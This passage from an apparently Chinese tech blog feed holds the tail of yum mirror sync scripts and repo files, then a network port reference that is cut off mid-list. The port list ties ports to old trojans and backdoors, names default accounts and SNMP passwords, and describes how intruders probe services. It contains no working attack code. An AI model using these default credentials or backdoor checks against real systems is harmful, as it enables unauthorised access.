2&gt;&gt; <span class="hljs-variable">$log6</span><br>createrepo -p /mds/yum/centos6/centosplus/Packages/ &gt;&gt; <span class="hljs-variable">$log6</span> 2&gt;&gt; <span class="hljs-variable">$log6</span><br><span class="hljs-comment">#重新将centos6的repo文件加上后缀.bak，使之不影响其他repo的更新</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/Centos-6.repo /etc/yum.repos.d/Centos-6.repo.bak<br><span class="hljs-comment">#防止新同步的包权限为默认的600，而导致客户端安装包时报错forbidden</span><br><span class="hljs-built_in">chmod</span> -R 755 /mds/yum/centos6COPY<br>[root@Yum-Reporsitory ~]<span class="hljs-comment"># cat auto_update_yum_centos7.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment">#设置日志文件名，以当前日期为后缀</span><br>DATE=`<span class="hljs-built_in">date</span> <span class="hljs-string">&quot;+%Y-%m-%d&quot;</span>`<br>log7=/root/yumsync7.<span class="hljs-built_in">log</span><span class="hljs-variable">$DATE</span><br><span class="hljs-built_in">echo</span> &gt; <span class="hljs-variable">$log7</span><br><span class="hljs-comment">#将/etc/yum.repos.d/目录下的所有repo文件加上.bak的后缀，防止之前执行失败而导致有xxx.repo.bak被改为xxx.repo而没有改回xxx.repo.bak</span><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> /etc/yum.repos.d/*.repo<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">mv</span> <span class="hljs-variable">$file</span> <span class="hljs-variable">$file</span>.bak &gt;&gt; /dev/null 2&gt;&gt; /dev/null<br><span class="hljs-keyword">done</span><br><span class="hljs-comment">#update centos7</span><br><span class="hljs-comment">#将centos6的repo文件的.bak后缀去除，使之开始生效</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/Centos-7.repo.bak /etc/yum.repos.d/Centos-7.repo<br>yum clean all<br>yum makecache<br><span class="hljs-comment">#同步centos7的包到本地</span><br>reposync -p /mds/yum/centos7 &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br><span class="hljs-comment">#为本地rpm包简历yum的索引</span><br>createrepo -p /mds/yum/centos7/base/Packages/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/extras/Packages/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/updates/Packages/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/centosplus/Packages/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br><span class="hljs-comment">#重新将centos7的repo文件加上后缀.bak，使之不影响其他repo的更新</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/Centos-7.repo /etc/yum.repos.d/Centos-7.repo.bak<br><span class="hljs-comment">#update docker</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/docker-ce.repo.bak /etc/yum.repos.d/docker-ce.repo<br>yum clean all<br>yum makecache<br>reposync -p /mds/yum/centos7 &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/docker-ce-stable/Packages/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/docker-ce.repo /etc/yum.repos.d/docker-ce.repo.bak<br><span class="hljs-comment">#update mysql56</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/mysql-community.repo.bak /etc/yum.repos.d/mysql-community.repo<br>yum clean all<br>yum makecache<br>reposync -p /mds/yum/centos7 &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/mysql56-community/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/mysql-connectors-community/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br>createrepo -p /mds/yum/centos7/mysql-tools-community/ &gt;&gt; <span class="hljs-variable">$log7</span> 2&gt;&gt; <span class="hljs-variable">$log7</span><br><span class="hljs-built_in">mv</span> /etc/yum.repos.d/mysql-community.repo /etc/yum.repos.d/mysql-community.repo.bak<br><span class="hljs-comment">#防止新同步的包权限为默认的600，而导致客户端安装包时报错forbidden</span><br><span class="hljs-built_in">chmod</span> -R 755 /mds/yum/centos7COPY<br></code></pre></td></tr></table></figure><h3 id="2、设置计划任务，每周日夜里执行一次"><a href="#2、设置计划任务，每周日夜里执行一次" class="headerlink" title="2、设置计划任务，每周日夜里执行一次"></a>2、设置计划任务，每周日夜里执行一次</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># crontab -e</span><br>0 0 * * 7 /root/auto_update_yum_centos6.sh &gt; /dev/null 2&gt; /dev/null<br>0 1 * * 7 /root/auto_update_yum_centos7.sh &gt; /dev/null 2&gt; /dev/nullCOPY<br></code></pre></td></tr></table></figure><h2 id="创建客户端yum源repo文件"><a href="#创建客户端yum源repo文件" class="headerlink" title="创建客户端yum源repo文件"></a>创建客户端yum源repo文件</h2><h3 id="1、CentOS6环境"><a href="#1、CentOS6环境" class="headerlink" title="1、CentOS6环境"></a>1、CentOS6环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># cat ncentos6.repo</span><br>[base]<br>name=centos6-base<br>baseurl=http://192.168.0.228/centos6/base/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br>[extras]<br>name=centos6-extras<br>baseurl=http://192.168.0.228/centos6/extras/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br>[updates]<br>name=centos6-updates<br>baseurl=http://192.168.0.228/centos6/updates/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<br>[centosplus]<br>name=centos6-centosplus<br>baseurl=http://192.168.0.228/centos6/centosplus/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6COPY<br></code></pre></td></tr></table></figure><h3 id="2、CentOS7环境"><a href="#2、CentOS7环境" class="headerlink" title="2、CentOS7环境"></a>2、CentOS7环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Yum-Repositories ~]<span class="hljs-comment"># cat ncentos7.repo</span><br>[base]<br>name=centos7-base<br>baseurl=http://192.168.0.228/centos7/base/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>[extras]<br>name=centos7-extras<br>baseurl=http://192.168.0.228/centos7/extras/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>[updates]<br>name=centos7-updates<br>baseurl=http://192.168.0.228/centos7/updates/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>[centosplus]<br>name=centos7-centosplus<br>baseurl=http://192.168.0.228/centos7/centosplus/Packages/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br>[docker]<br>name=centos7-docker<br>baseurl=http://192.168.0.228/centos7/docker-ce-stable/Packages/<br>gpgcheck=1<br>gpgkey=http://192.168.0.228/RPM-GPG-KEY-Docker<br>[mysql56-community]<br>name=centos7-mysql56-community<br>baseurl=http://192.168.0.228/centos7/mysql56-community/<br>gpgcheck=1<br>gpgkey=http://192.168.0.228/RPM-GPG-KEY-mysql56<br>[mysql-tools-community]<br>name=centos7-mysql-tools-community<br>baseurl=http://192.168.0.228/centos7/mysql-tools-community/<br>gpgcheck=1<br>gpgkey=http://192.168.0.228/RPM-GPG-KEY-mysql56<br>[mysql-connectors-community]<br>name=centos7-mysql-connectors-community<br>baseurl=http://192.168.0.228/centos7/mysql-connectors-community/<br>gpgcheck=1<br>gpgkey=http://192.168.0.228/RPM-GPG-KEY-mysql56<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络端口大全</title>
    <link href="/2023/07/28/%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E5%A4%A7%E5%85%A8/"/>
    <url>/2023/07/28/%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E5%A4%A7%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>一、端口概念</strong></p><p>在网络技术中，端口（Port）大致有两种意思：</p><ul><li>一是物理意义上的端口，比如，ADSL Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。</li><li>二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。</li></ul><p><strong>二、网络端口的分类</strong></p><p>按端口号可分为3大类：</p><p><strong>（1）公认端口（Well-KnownPorts）：</strong>范围从0到1023</p><p><strong>（2）动态端口（Dynamic Ports）：</strong>范围从1024到65535</p><p> <strong>(2.1)注册端口（RegisteredPorts）：</strong>从1024到49151</p><p> <strong>(2.2)动态和/或私有端口（Dynamicand/orPrivatePorts）：</strong>：从49152到65535。</p><p>端口：0</p><p>服务：Reserved</p><p>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p><p>端口：1</p><p>服务：tcpmux</p><p>说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。微信搜索公众号：信安黑客技术，回复：黑客 领取资料 。</p><p>端口：7</p><p>服务：Echo</p><p>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p><p>端口：19</p><p>服务：Character Generator</p><p>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><p>端口：21</p><p>服务：FTP</p><p>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。</p><p>端口：22</p><p>服务：Ssh</p><p>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p>端口：23</p><p>服务：Telnet</p><p>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。</p><p>端口：25</p><p>服务：SMTP</p><p>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。</p><p>端口：31</p><p>服务：MSG Authentication</p><p>说明：木马Master Paradise、Hackers Paradise开放此端口。</p><p>端口：42</p><p>服务：WINS Replication</p><p>说明：WINS复制</p><p>端口：53</p><p>服务：Domain Name Server（DNS）</p><p>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><p>端口：67</p><p>服务：Bootstrap Protocol Server</p><p>说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><p>端口：69</p><p>服务：Trival File Transfer</p><p>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。</p><p>端口：79</p><p>服务：Finger Server</p><p>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>端口：80</p><p>服务：HTTP</p><p>说明：用于网页浏览。木马Executor开放此端口。</p><p>端口：99</p><p>服务：Metagram Relay</p><p>说明：后门程序ncx99开放此端口。</p><p>端口：102</p><p>服务：Message transfer agent(MTA)-X.400 over TCP/IP</p><p>说明：消息传输代理。</p><p>端口：109</p><p>服务：Post Office Protocol -Version3</p><p>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>端口：110</p><p>服务：SUN公司的RPC服务所有端口</p><p>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>端口：113</p><p>服务：Authentication Service</p><p>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>端口：119</p><p>服务：Network News Transfer Protocol</p><p>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p><p>端口：135</p><p>服务：Location Service</p><p>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p><p>端口：137、138、139</p><p>服务：NETBIOS Name Service</p><p>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p><p>端口：143</p><p>服务：Interim Mail Access Protocol v2</p><p>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p><p>端口：161</p><p>服务：SNMP</p><p>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>端口：177</p><p>服务：X Display Manager Control Protocol</p><p>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p><p>端口：389</p><p>服务：LDAP、ILS</p><p>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p><p>端口：443</p><p>服务：Https</p><p>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p><p>端口：456</p><p>服务：[NULL]</p><p>说明：木马HACKERS PARADISE开放此端口。</p><p>端口：513</p><p>服务：Login,remote login</p><p>说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>端口：544</p><p>服务：[NULL]</p><p>说明：kerberos kshell</p><p>端口：548</p><p>服务：Macintosh,File Services(AFP/IP)</p><p>说明：Macintosh,文件服务。</p><p>端口：553</p><p>服务：CORBA IIOP （UDP）</p><p>说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>端口：555</p><p>服务：DSF</p><p>说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。</p><p>端口：568</p><p>服务：Membership DPA</p><p>说明：成员资格 DPA。</p><p>端口：569</p><p>服务：Membership MSN</p><p>说明：成员资格 MSN。</p><p>端口：635</p><p>服务：mountd</p><p>说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。</p><p>端口：636</p><p>服务：LDAP</p><p>说明：SSL（Secure Sockets layer）</p><p>端口：666</p><p>服务：Doom Id Software</p><p>说明：木马Attack FTP、Satanz Backdoor开放此端口</p><p>端口：993</p><p>服务：IMAP</p><p>说明：SSL（Secure Sockets layer）</p><p>端口：1001、1011</p><p>服务：[NULL]</p><p>说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。</p><p>端口：1024</p><p>服务：Reserved</p><p>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。</p><p>端口：1025、1033</p><p>服务：1025：network blackjack 1033：[NULL]</p><p>说明：木马netspy开放这2个端口。</p><p>端口：1080</p><p>服务：SOCKS</p><p>说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。端口：1170服务：[NULL]说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。</p><p>端口：1234、1243、6711、6776</p><p>服务：[NULL]</p><p>说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p><p>端口：1245</p><p>服务：[NULL]</p><p>说明：木马Vodoo开放此端口。</p><p>端口：1433</p><p>服务：SQL</p><p>说明：Microsoft的SQL服务开放的端口。</p><p>端口：1492</p><p>服务：stone-design-1</p><p>说明：木马FTP99CMP开放此端口。</p><p>端口：1500</p><p>服务：RPC client fixed port session queries</p><p>说明：RPC客户固定端口会话查询</p><p>端口：1503</p><p>服务：NetMeeting T.120</p><p>说明：NetMeeting T.120</p><p>端口：1524</p><p>服务：ingress</p><p>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><p>端口：1600</p><p>服务：issd</p><p>说明：木马Shivka-Burka开放此端口。</p><p>端口：1720</p><p>服务：NetMeeting</p><p>说明：NetMeeting H.233 call Setup。</p><p>端口：1731</p><p>服务：NetMeeting Audio Call Control</p><p>说明：NetMeeting音频调用控制。</p><p>端口：1807</p><p>服务：[NULL]</p><p>说明：木马SpySender开放此端口。</p><p>端口：1981</p><p>服务：[NULL]</p><p>说明：木马ShockRave开放此端口。</p><p>端口：1999</p><p>服务：cisco identification port</p><p>说明：木马BackDoor开放此端口。</p><p>端口：2000</p><p>服务：[NULL]</p><p>说明：木马GirlFriend 1.3、Millenium 1.0开放此端口。</p><p>端口：2001</p><p>服务：[NULL]</p><p>说明：木马Millenium 1.0、Trojan Cow开放此端口。</p><p>端口：2023</p><p>服务：xinuexpansion 4</p><p>说明：木马Pass Ripper开放此端口。</p><p>端口：2049</p><p>服务：NFS</p><p>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。</p><p>端口：2115</p><p>服务：[NULL]</p><p>说明：木马Bugs开放此端口。</p><p>端口：2140、3150</p><p>服务：[NULL]</p><p>说明：木马Deep Throat 1.0/3.0开放此端口。</p><p>端口：2500</p><p>服务：RPC client using a fixed port session replication</p><p>说明：应用固定端口会话复制的RPC客户</p><p>端口：2583</p><p>服务：[NULL]</p><p>说明：木马Wincrash 2.0开放此端口。</p><p>端口：2801</p><p>服务：[NULL]</p><p>说明：木马Phineas Phucker开放此端口。</p><p>端口：3024、4092</p><p>服务：[NULL]</p><p>说明：木马WinCrash开放此端口。</p><p>端口：3128</p><p>服务：squid</p><p>说明：这是squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。</p><p>端口：3129</p><p>服务：[NULL]</p><p>说明：木马Master Paradise开放此端口。</p><p>端口：3150</p><p>服务：[NULL]</p><p>说明：木马The Invasor开放此端口。</p><p>端口：3210、4321</p><p>服务：[NULL]</p><p>说明：木马SchoolBus开放此端口</p><p>端口：3333</p><p>服务：dec-notes</p><p>说明：木马Prosiak开放此端口</p><p>端口：3389</p><p>服务：超级终端</p><p>说明：WINDOWS 2000终端开放此端口。</p><p>端口：3700</p><p>服务：[NULL]</p><p>说明：木马Portal of Doom开放此端口</p><p>端口：3996、4060</p><p>服务：[NULL]</p><p>说明：木马RemoteAnything开放此端口</p><p>端口：4000</p><p>服务：QQ客户端</p><p>说明：腾讯QQ客户端开放此端口。</p><p>端口：4092</p><p>服务：[NULL]</p><p>说明：木马WinCrash开放此端口。</p><p>端口：4590</p><p>服务：[NULL]</p><p>说明：木马ICQTrojan开放此端口。</p><p>端口：5000、5001、5321、50505</p><p>服务：[NULL]</p><p>说明：木马blazer5开放5000端口。木马Sockets de Troie开放5000、5001、5321、50505端口。</p><p>端口：5400、5401、5402</p><p>服务：[NULL]</p><p>说明：木马Blade Runner开放此端口。</p><p>端口：5550</p><p>服务：[NULL]</p><p>说明：木马xtcp开放此端口。</p><p>端口：5569</p><p>服务：[NULL]</p><p>说明：木马Robo-Hack开放此端口。</p><p>端口：5632</p><p>服务：pcAnywere</p><p>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。</p><p>端口：5742</p><p>服务：[NULL]</p><p>说明：木马WinCrash1.03开放此端口。</p><p>端口：6267</p><p>服务：[NULL]</p><p>说明：木马广外女生开放此端口。</p><p>端口：6400</p><p>服务：[NULL]</p><p>说明：木马The tHing开放此端口。</p><p>端口：6670、6671</p><p>服务：[NULL]</p><p>说明：木马Deep Throat开放6670端口。而Deep Throat 3.0开放6671端口。</p><p>端口：6883</p><p>服务：[NULL]</p><p>说明：木马DeltaSource开放此端口。</p><p>端口：6969</p><p>服务：[NULL]</p><p>说明：木马Gatecrasher、Priority开放此端口。</p><p>端口：6970</p><p>服务：RealAudio</p><p>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。</p><p>端口：7000</p><p>服务：[NULL]</p><p>说明：木马Remote Grab开放此端口。</p><p>端口：7300、7301、7306、7307、7308</p><p>服务：[NULL]</p><p>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。</p><p>端口：7323</p><p>服务：[NULL]</p><p>说明：Sygate服务器端。</p><p>端口：7626</p><p>服务：[NULL]</p><p>说明：木马Giscier开放此端口。</p><p>端口：7789</p><p>服务：[NULL]</p><p>说明：木马ICKiller开放此端口。</p><p>端口：8000</p><p>服务：OICQ</p><p>说明：腾讯QQ服务器端开放此端口。</p><p>端口：8010</p><p>服务：Wingate</p><p>说明：Wingate代理开放此端口。</p><p>端口：8080</p><p>服务：代理端口</p><p>说明：WWW代理开放此端口。</p><p>端口：9400、9401、9402</p><p>服务：[NULL]</p><p>说明：木马Incommand 1.0开放此端口。</p><p>端口：9872、9873、9874、9875、10067、10167</p><p>服务：[NULL]</p><p>说明：木马Portal of Doom开放此端口。</p><p>端口：9989</p><p>服务：[NULL]</p><p>说明：木马iNi-Killer开放此端口。</p><p>端口：11000</p><p>服务：[NULL]</p><p>说明：木马SennaSpy开放此端口。</p><p>端口：11223</p><p>服务：[NULL]</p><p>说明：木马Progenic trojan开放此端口。</p><p>端口：12076、61466</p><p>服务：[NULL]</p><p>说明：木马Telecommando开放此端口。page]</p><p>端口：12223</p><p>服务：[NULL]</p><p>说明：木马Hack’99 KeyLogger开放此端口。</p><p>端口：12345、12346</p><p>服务：[NULL]</p><p>说明：木马NetBus1.60/1.70、GabanBus开放此端口。</p><p>端口：12361</p><p>服务：[NULL]</p><p>说明：木马Whack-a-mole开放此端口。</p><p>端口：13223</p><p>服务：PowWow</p><p>说明：PowWow是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><p>端口：16969</p><p>服务：[NULL]</p><p>说明：木马Priority开放此端口。</p><p>端口：17027</p><p>服务：Conducent</p><p>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。</p><p>端口：19191</p><p>服务：[NULL]</p><p>说明：木马蓝色火焰开放此端口。</p><p>端口：20000、20001</p><p>服务：[NULL]</p><p>说明：木马Millennium开放此端口。</p><p>端口：20034</p><p>服务：[NULL]</p><p>说明：木马NetBus Pro开放此端口。</p><p>端口：21554</p><p>服务：[NULL]</p><p>说明：木马GirlFriend开放此端口。</p><p>端口：22222</p><p>服务：[NULL]</p><p>说明：木马Prosiak开放此端口。</p><p>端口：23456</p><p>服务：[NULL]</p><p>说明：木马Evil FTP、Ugly FTP开放此端口。</p><p>端口：26274、47262</p><p>服务：[NULL]</p><p>说明：木马Delta开放此端口。</p><p>端口：27374</p><p>服务：[NULL]</p><p>说明：木马Subseven 2.1开放此端口。</p><p>端口：30100</p><p>服务：[NULL]</p><p>说明：木马NetSphere开放此端口。</p><p>端口：30303</p><p>服务：[NULL]</p><p>说明：木马Socket23开放此端口。</p><p>端口：30999</p><p>服务：[NULL]</p><p>说明：木马Kuang开放此端口。</p><p>端口：31337、31338</p><p>服务：[NULL]</p><p>说明：木马BO(Back Orifice)开放此端口。另外木马DeepBO也开放31338端口。</p><p>端口：31339</p><p>服务：[NULL]</p><p>说明：木马NetSpy 